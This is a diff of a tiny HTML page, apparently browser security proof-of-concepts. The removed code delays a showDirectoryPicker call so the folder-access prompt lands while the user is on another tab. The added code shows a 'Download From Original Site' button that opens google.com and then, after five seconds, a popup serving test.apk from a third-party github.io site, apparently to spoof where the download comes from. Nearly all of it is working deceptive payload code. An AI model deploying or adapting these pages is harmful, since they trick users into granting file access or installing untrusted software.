@@ -1,58 +1,30 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>Adaptive Delayed showDirectoryPicker</title>
+<html>
+ <head> 
+  <meta charset="utf-8">
 <style>
-  body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-family: system-ui, sans-serif;
-    background: #fafafa;
-    cursor: pointer;
-    user-select: none;
-  }
-  h1 {
-    max-width: 420px;
-    text-align: center;
-    color: #333;
-    padding: 20px;
-  }
-  small { color: #666; }
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
 </style>
-</head>
-<body>
-
-<h1>
-Click once.<br>
-Switch tab before folder picker appears.<br>
-<small>(adaptive delay)</small>
-</h1>
-
-<script>
-const DELAYS = [1500, 2500, 3500, 5000];
-let fired = false;
-
-document.addEventListener('click', () => {
-
-  DELAYS.forEach(delay => {
-    setTimeout(async () => {
-      if (fired) return;
-      fired = true;
-
-      try {
-        if ('showDirectoryPicker' in window) {
-          await window.showDirectoryPicker();
-        }
-      } catch (e) {}
-    }, delay);
-  });
-
-}, { once: true });
-</script>
-
-</body>
+ </head> 
+ <body> 
+  <script>
+function a(){
+    window.open('https://google.com', '_blank');
+    setTimeout(function(){
+        window.open('https://frozzipies.github.io/test.apk', '_blank', "popup=yes,width=900,height=700");
+    }, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
